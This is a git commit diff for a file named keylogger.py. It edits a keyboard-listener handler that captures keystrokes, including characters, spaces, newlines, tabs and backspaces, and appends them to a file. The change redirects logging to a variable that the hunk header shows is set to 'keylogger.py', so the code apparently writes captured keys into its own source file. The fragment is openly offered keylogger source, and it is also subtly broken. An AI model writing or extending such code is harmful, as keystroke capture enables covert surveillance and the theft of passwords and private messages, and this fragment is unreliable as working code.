b1dd60a043264873c8e8c9592e02161eee277d3a
IsraelAlan10 <106551621+IsraelAlan10@users.noreply.github.com>
2024-08-20 06:47:57 -0600

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -5,20 +5,20 @@ file = "keylogger.py"
 def on_press(key):
     try:
         if hasattr(key, 'char'):
-            with open(log_file, "a") as f:
+            with open(file, "a") as f:
                 f.write(key.char)
         else:
             if key == keyboard.Key.space:
-                with open(log_file, "a") as f:
+                with open(file, "a") as f:
                     f.write(' ')
             elif key == keyboard.Key.enter:
-                with open(log_file, "a") as f:
+                with open(file, "a") as f:
                     f.write('\n')
             elif key == keyboard.Key.tab:
-                with open(log_file, "a") as f:
+                with open(file, "a") as f:
                     f.write('\t')
             elif key == keyboard.Key.backspace:
-                with open(log_file, "a") as f:
+                with open(file, "a") as f:
                     f.write('\b')
     except Exception as e:
         print(f"Error: {e}")
